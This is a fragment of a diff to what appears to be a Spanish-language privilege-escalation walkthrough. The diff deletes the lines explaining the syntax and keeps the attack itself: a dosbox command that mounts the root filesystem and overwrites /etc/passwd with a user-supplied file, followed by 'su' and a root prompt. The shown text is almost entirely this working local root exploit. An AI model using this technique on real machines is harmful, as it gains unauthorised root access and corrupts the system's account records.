@@ -92,11 +92,5 @@ direccione a /etc/passwd y asi sobreescribir la informacion original y escarlar 
 
 /usr/bin/dosbox -c 'mount c /' -c 'type c:\home\ninhack\passwd > c:\etc\passwd' -c exit
 
-'mount c /' = cambiamos c por / (c es el equivalente en windows de / en linux)
-type en windows es el equivalente de cat en linux
-
-asi que esto: 'type c:\home\ninhack\passwd > c:\etc\passwd' es en windows
-lo que 'cat /home/ninhack/passwd > /etc/passwd' seria en linux
-
 su 
 #root
